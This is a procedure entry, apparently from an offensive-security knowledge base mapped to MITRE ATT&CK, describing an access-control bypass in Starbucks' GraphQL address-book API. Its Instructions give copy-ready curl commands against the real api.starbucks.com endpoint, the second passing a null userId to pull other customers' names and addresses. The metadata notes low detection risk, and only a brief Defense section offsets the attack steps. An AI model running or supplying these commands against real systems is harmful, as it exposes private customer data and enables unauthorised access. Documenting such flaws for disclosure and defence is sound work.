---
id: proc-uuid-1
name: Craft-Malicious-GraphQL-Query-for-Address-Book
tags:
  - graphql
  - access-control
  - bypass
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/send-graphql-query-curl]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:48.508Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-Malicious-GraphQL-Query-for-Address-Book

## Summary

This procedure exploits a bug in the Starbucks GraphQL implementation by modifying a query for personal address book entries, causing the backend API to receive an 'undefined' parameter and fail to enforce user-specific access controls, leading to partial data disclosure.

## Description

In the Starbucks application, the GraphQL endpoint for fetching address book data relies on user-specific parameters. By altering the query variables (e.g., setting userId to null or an invalid value), the backend API interprets the request as coming from an account with username 'undefined', disclosing limited address entries from such accounts. This does not enable full horizontal privilege escalation but reveals sensitive user data. The attack requires an authenticated session and targets the web platform's GraphQL integration.

## Requirements

1. Authenticated session in the Starbucks web app (valid API token)
2. Access to GraphQL endpoint (e.g., via browser or API client)
3. Basic knowledge of GraphQL query structure

## Defense

Defensive measures and detection strategies:

- Implement strict input validation in GraphQL resolvers to handle null/undefined parameters
- Enforce user ID binding at the API gateway level to prevent parameter tampering
- Log and monitor GraphQL queries for anomalous variables (e.g., null userId)

## Objectives

1. Bypass access controls to access non-owned address book data
2. Confirm vulnerability by extracting sample entries
3. Demonstrate limited data exfiltration without account takeover

## Instructions

### Step 1: Identify Standard GraphQL Query

**Context**: Inspect the legitimate query used for fetching personal address book via browser network tools or app source.

**Command** ([[commands/send-graphql-query-curl]]):
```bash
curl -X POST https://api.starbucks.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query": "query GetAddressBook($userId: ID!) { addressBook(userId: $userId) { entries { name address } } }", "variables": {"userId": "your_user_id"}}'
```

> This sends a valid query and returns only your own data. Expected output: JSON with personal addresses.

### Step 2: Modify Variables to Trigger 'Undefined' Parameter

**Context**: Alter the variables to null or empty, causing backend propagation of 'undefined'.

**Command** ([[commands/send-graphql-query-curl]]):
```bash
curl -X POST https://api.starbucks.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query": "query GetAddressBook($userId: ID!) { addressBook(userId: $userId) { entries { name address } } }", "variables": {"userId": null}}'
```

> The backend API will use 'undefined' as the username, disclosing addresses from matching accounts. Expected output: JSON with foreign address entries.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/send-graphql-query-curl]]

## Tools Used


## Tags

- [[graphql]]
- [[access-control]]
- [[bypass]]
